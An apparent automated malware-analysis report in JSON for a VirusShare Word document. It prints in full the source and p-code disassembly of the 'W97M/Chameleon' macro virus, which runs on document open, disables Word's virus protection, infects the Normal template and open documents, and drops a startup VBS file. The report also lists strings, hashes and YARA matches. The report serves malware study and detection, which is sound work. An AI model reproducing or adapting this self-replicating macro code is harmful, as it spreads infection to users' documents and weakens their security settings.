{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Call": "May call a DLL using Excel 4 Macros",
            "CodeModule": "May attempt to modify the VBA code",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "System": "May run an executable file or a system command on a Mac",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Windows": "May enumerate application windows"
        },
        "macro": "Sub AutoOpen()\n    On Error Resume Next\n    If System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\", \"MVP\") <> \"Enabled by Total Konfuzion\" Then\n        Randomize\n        Call VScript\n        Dim x, rn\n        Options.VirusProtection = (Rnd * 0)\n        Options.SaveNormalPrompt = (Rnd * 0)\n        Options.ConfirmConversions = (Rnd * 0)\n        Options.SavePropertiesPrompt = (Rnd * 0)\n        Application.EnableCancelKey = wdCancelDisabled: Application.DisplayAlerts = (Rnd * 0)\n        Set n = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule\n        Set a = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule\n        Set td = ThisDocument.VBProject.VBComponents.Item(1).CodeModule\n        Open \"C:\\Windows\\System\\Chameleon.dll\" For Output As #1\n            Print #1, td.Lines(1, td.CountOfLines)\n        Close #1\n        If n.Lines(42, 1) <> \"W97M/Chameleon\" Then\n            n.DeleteLines 1, n.CountOfLines\n            n.AddFromFile (\"C:\\Windows\\System\\Chameleon.dll\")\n            n.ReplaceLine 42, \"Sub ViewVBCode()\"\n            For x = 46 To 62 Step 2\n                rn = (Rnd * 1000)\n                n.ReplaceLine x, \"'\" & rn & Application.UserName\n            Next x\n        End If\n        If a.Lines(42, 1) <> \"W97M/Chameleon\" Then\n            a.DeleteLines 1, a.CountOfLines\n            a.AddFromFile (\"C:\\Windows\\System\\Chameleon.dll\")\n            a.ReplaceLine 45, \"Sub ToolsMacro()\"\n            For x = 46 To 62 Step 2\n                rn = (Rnd * 1000)\n                a.ReplaceLine x, \"'\" & rn & Application.ActivePrinter\n            Next x\n            ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument\n        End If\n        Set n = Nothing\n        Set a = Nothing\n        Set td = Nothing\n        If Day(Now) = 18 Then MsgBox \"Let me slip into something\" & vbCr & \"a little more comfortable... :)\", 4096, \"W97M/Chameleon\"\n    End If\n' W97M/Chameleon\n'   by: Total Konfuzion\nEnd Sub\nSub ToolsMacro()\n\nEnd Sub\n\nPrivate Function VScript()\n\n    On Error Resume Next\n\n    Open \"C:\\Windows\\Start Menu\\Programs\\Startup\\Chameleon.vbs\" For Output As #1\n\n        Print #1, \"' W97M/Chameleon\"\n\n        Print #1, \"'    by: Total Konfuzion\"\n\n        Print #1, \"msgbox \"\"             Greetz from Chameleon   :)             \"\",4096,\"\"W97M/Chameleon\"\"\"\n\n    Close #1\n\nEnd Function\n\n\n' Processing file: VirusShare_0e07f5b3e6f9f436bef275de9c4267d9\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 4676 bytes\n' Line #0:\n' \tFuncDefn (Sub AutoOpen())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x003C \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\"\n' \tLitStr 0x0003 \"MVP\"\n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tLitStr 0x001A \"Enabled by Total Konfuzion\"\n' \tNe \n' \tIfBlock \n' Line #3:\n' \tArgsCall Read 0x0000 \n' Line #4:\n' \tArgsCall (Call) VScript 0x0000 \n' Line #5:\n' \tDim \n' \tVarDefn x\n' \tVarDefn rn\n' Line #6:\n' \tLd Rnd \n' \tLitDI2 0x0000 \n' \tMul \n' \tParen \n' \tLd Options \n' \tMemSt VirusProtection \n' Line #7:\n' \tLd Rnd \n' \tLitDI2 0x0000 \n' \tMul \n' \tParen \n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #8:\n' \tLd Rnd \n' \tLitDI2 0x0000 \n' \tMul \n' \tParen \n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #9:\n' \tLd Rnd \n' \tLitDI2 0x0000 \n' \tMul \n' \tParen \n' \tLd Options \n' \tMemSt SavePropertiesPrompt \n' Line #10:\n' \tLd wdCancelDisabled \n' \tLd Application \n' \tMemSt EnableCancelKey \n' \tBoS 0x0000 \n' \tLd Rnd \n' \tLitDI2 0x0000 \n' \tMul \n' \tParen \n' \tLd Application \n' \tMemSt DisplayAlerts \n' Line #11:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tSet n \n' Line #12:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tSet a \n' Line #13:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ThisDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tSet td \n' Line #14:\n' \tLitStr 0x001F \"C:\\Windows\\System\\Chameleon.dll\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #15:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitDI2 0x0001 \n' \tLd td \n' \tMemLd CountOfLines \n' \tLd td \n' \tArgsMemLd Lines 0x0002 \n' \tPrintItemNL \n' Line #16:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #17:\n' \tLitDI2 0x002A \n' \tLitDI2 0x0001 \n' \tLd n \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x000E \"W97M/Chameleon\"\n' \tNe \n' \tIfBlock \n' Line #18:\n' \tLitDI2 0x0001 \n' \tLd n \n' \tMemLd CountOfLines \n' \tLd n \n' \tArgsMemCall DeleteLines 0x0002 \n' Line #19:\n' \tLitStr 0x001F \"C:\\Windows\\System\\Chameleon.dll\"\n' \tParen \n' \tLd n \n' \tArgsMemCall AddFromFile 0x0001 \n' Line #20:\n' \tLitDI2 0x002A \n' \tLitStr 0x0010 \"Sub ViewVBCode()\"\n' \tLd n \n' \tArgsMemCall ReplaceLine 0x0002 \n' Line #21:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x002E \n' \tLitDI2 0x003E \n' \tLitDI2 0x0002 \n' \tForStep \n' Line #22:\n' \tLd Rnd \n' \tLitDI2 0x03E8 \n' \tMul \n' \tParen \n' \tSt rn \n' Line #23:\n' \tLd x \n' \tLitStr 0x0001 \"'\"\n' \tLd rn \n' \tConcat \n' \tLd Application \n' \tMemLd UserName \n' \tConcat \n' \tLd n \n' \tArgsMemCall ReplaceLine 0x0002 \n' Line #24:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #25:\n' \tEndIfBlock \n' Line #26:\n' \tLitDI2 0x002A \n' \tLitDI2 0x0001 \n' \tLd a \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x000E \"W97M/Chameleon\"\n' \tNe \n' \tIfBlock \n' Line #27:\n' \tLitDI2 0x0001 \n' \tLd a \n' \tMemLd CountOfLines \n' \tLd a \n' \tArgsMemCall DeleteLines 0x0002 \n' Line #28:\n' \tLitStr 0x001F \"C:\\Windows\\System\\Chameleon.dll\"\n' \tParen \n' \tLd a \n' \tArgsMemCall AddFromFile 0x0001 \n' Line #29:\n' \tLitDI2 0x002D \n' \tLitStr 0x0010 \"Sub ToolsMacro()\"\n' \tLd a \n' \tArgsMemCall ReplaceLine 0x0002 \n' Line #30:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x002E \n' \tLitDI2 0x003E \n' \tLitDI2 0x0002 \n' \tForStep \n' Line #31:\n' \tLd Rnd \n' \tLitDI2 0x03E8 \n' \tMul \n' \tParen \n' \tSt rn \n' Line #32:\n' \tLd x \n' \tLitStr 0x0001 \"'\"\n' \tLd rn \n' \tConcat \n' \tLd Application \n' \tMemLd ActivePrinter \n' \tConcat \n' \tLd a \n' \tArgsMemCall ReplaceLine 0x0002 \n' Line #33:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #34:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd wdFormatDocument \n' \tParamNamed FileFormat \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0002 \n' Line #35:\n' \tEndIfBlock \n' Line #36:\n' \tSetStmt \n' \tLitNothing \n' \tSet n \n' Line #37:\n' \tSetStmt \n' \tLitNothing \n' \tSet a \n' Line #38:\n' \tSetStmt \n' \tLitNothing \n' \tSet td \n' Line #39:\n' \tLd Now \n' \tArgsLd Day 0x0001 \n' \tLitDI2 0x0012 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x001A \"Let me slip into something\"\n' \tLd vbCr \n' \tConcat \n' \tLitStr 0x001F \"a little more comfortable... :)\"\n' \tConcat \n' \tLitDI2 0x1000 \n' \tLitStr 0x000E \"W97M/Chameleon\"\n' \tArgsCall MsgBox 0x0003 \n' \tEndIf \n' Line #40:\n' \tEndIfBlock \n' Line #41:\n' \tQuoteRem 0x0000 0x000F \" W97M/Chameleon\"\n' Line #42:\n' \tQuoteRem 0x0000 0x0016 \"   by: Total Konfuzion\"\n' Line #43:\n' \tEndSub \n' Line #44:\n' \tFuncDefn (Sub ToolsMacro())\n' Line #45:\n' Line #46:\n' \tEndSub \n' Line #47:\n' Line #48:\n' \tFuncDefn (Private Function VScript(id_FFFE As Variant))\n' Line #49:\n' Line #50:\n' \tOnError (Resume Next) \n' Line #51:\n' Line #52:\n' \tLitStr 0x0034 \"C:\\Windows\\Start Menu\\Programs\\Startup\\Chameleon.vbs\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #53:\n' Line #54:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0010 \"' W97M/Chameleon\"\n' \tPrintItemNL \n' Line #55:\n' Line #56:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0018 \"'    by: Total Konfuzion\"\n' \tPrintItemNL \n' Line #57:\n' Line #58:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0053 \"msgbox \"             Greetz from Chameleon   :)             \",4096,\"W97M/Chameleon\"\"\n' \tPrintItemNL \n' Line #59:\n' Line #60:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #61:\n' Line #62:\n' \tEndFunc \n' Line #63:\n"
    },
    "filename": "VirusShare_0e07f5b3e6f9f436bef275de9c4267d9",
    "filesize": 30208,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Total Konfuzion, Template: Normal.dot, Last Saved By: Total Konfuzion, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Create Time/Date: Wed Aug  9 14:42:00 2000, Last Saved Time/Date: Wed Aug  9 14:43:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "0e07f5b3e6f9f436bef275de9c4267d9",
        "sha1": "0acb2e5d49be575ce537fc7e5c3f2d5eab5eea07",
        "sha256": "e9d242ae7e159794857bdbb6a720f973dac88d7a1581e21fec001a95ff3a53f9"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            ". A!",
            "KHfKHf",
            "Total Konfuzion",
            "Normal.dot",
            "Total Konfuzion",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "1339915fd2",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "AutoOpen*",
            "Documentj",
            "Systema",
            "PrivateProfileString[",
            "VScript",
            "Options",
            "VirusProtectionoD",
            "RndR",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "SavePropertiesPromptp",
            "Application*",
            "EnableCancelKey",
            "wdCancelDisabled{",
            "DisplayAlerts",
            "NormalTemplateq",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "CodeModule",
            "eon.@$",
            "   by: Total Konfuzionoftw",
            "'    by: Total Konfuzion",
            "C:\\Windows\\System\\Chameleon.dll",
            "W97M/Chameleon",
            "C:\\Windows\\System\\Chameleon.dll",
            "Sub ViewVBCode() ",
            "/Chameh",
            "W97M/Chameleon",
            "C:\\Windows\\System\\Chameleon.dll",
            "Sub ToolsMacro() ",
            "tem\\Ch",
            "Let me slip into something ",
            "a little more comfortable... :)",
            "W97M/ChameleonA@j",
            " W97M/Chameleon",
            "C:\\Windows\\Start Menu\\Programs\\Startup\\Chameleon.vbs",
            "' W97M/Chameleon",
            "msgbox \"             Greetz from Chameleon   :)             \",4096,\"W97M/Chameleon\"",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion",
            "Enabled by Total Konfuzion",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "Sub Auto",
            "Open()",
            "On Err@or Res",
            "Next",
            "System.P",
            "8Profil",
            "eSng(\"\"",
            ", \"HKEY_",
            "LOCAL_MA",
            "CHINE\\So",
            "n\\Mic",
            "\\Win",
            "dows\\Cur",
            "Versio",
            "MVP\") @<> \"En",
            " by Tota",
            "l Konfuz",
            " ThenIX|Ra&",
            "all VScr",
            "Dim ",
            "x, r",
            "(s.Virus13tec",
            "@a(Rnd * 0E",
            "Save}@",
            "C-irmu",
            "p`ertie$V",
            "A@pplica",
            "KCancelK$ey",
            "DirsBR: ",
            "$Set n",
            ":E.VB@'",
            "Compo\"nps.I",
            ").CodeMoXdulcA",
            "Wveu",
            " \"C:\u01a2C[",
            "leon.dll\" F",
            "Output Aps #1N",
            ", td.L@ines(1b",
            "CountOfB",
            "H\\Clx",
            "`jn$",
            "2, 1c_W974M/&",
            "n.@Delete\"",
            "n.AddFromFu (",
            "Re`E*c",
            "ViewVB=()!",
            "&x=46`w",
            " 62 Stepl 2",
            "rK$m100me\tn.",
            "w\"'\" &x",
            "\tZpUser!",
            "EzIf",
            "/a/!",
            "a/a/.a/N/a* 45",
            "/ToolsMa`//* /",
            "/c{\"ber",
            ",%0?a",
            "T8:=!",
            "Full",
            "Kmat:=w>d#",
            "<gthing",
            "P=@,",
            "0#Day(Now)",
            " MsgBox ",
            "\"LPSslip",
            " into so",
            "a+vbCr",
            "+\"a litt",
            " more co",
            "mfor2...",
            " :)p4096O",
            "by:-s",
            "v} FunpTt",
            "[Utart  Menu\\Pcgr ams\\S1",
            "upVvbsV\t\"1",
            "b%V\"=",
            "msgb",
            "Greetz fS ",
            "<:)&",
            "ActiveDocument\\",
            "td=_",
            "Lines",
            "CountOfLines!\\",
            "DeleteLines",
            "AddFromFileu",
            "ReplaceLine",
            "UserName\\",
            "ActivePrinterp",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "FileFormat",
            "wdFormatDocument",
            "Now%",
            "MsgBoxR",
            "vbCr",
            "ToolsMacrou",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F755A",
            "BC23-2D1",
            "9-11D4-8",
            "F73-89EB",
            "29402700",
            "3.twd#M",
            "icrosoft ",
            "` Ob",
            " LibraryG",
            "PCAA84365-6DFF",
            "85-44455h3541",
            "PJP \\VBE\\(EX",
            "D(.E",
            "CxN@Ual",
            "CxNTax",
            " 5+\t,C",
            "icDO@f",
            "2DF8D04C",
            "-5BFA-101B-BDE5@TAA@4",
            "ROGRAM F",
            "ILES\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLCB# 8.0k",
            "BThisDoc@ument",
            "h@6sD",
            "ThisDocument",
            "ID=\"{5A58A074-6E00-11D4-8F85-444553540001}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"8486EA64EAF0EEF0EEF0EEF0EE\"",
            "DPB=\"14167A149AA59BA59BA5\"",
            "GC=\"A4A6CA84CA15CB15CBEA\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 595, 414, ",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "C:\\Windows\\System\\Chameleon.dll": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.352883",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
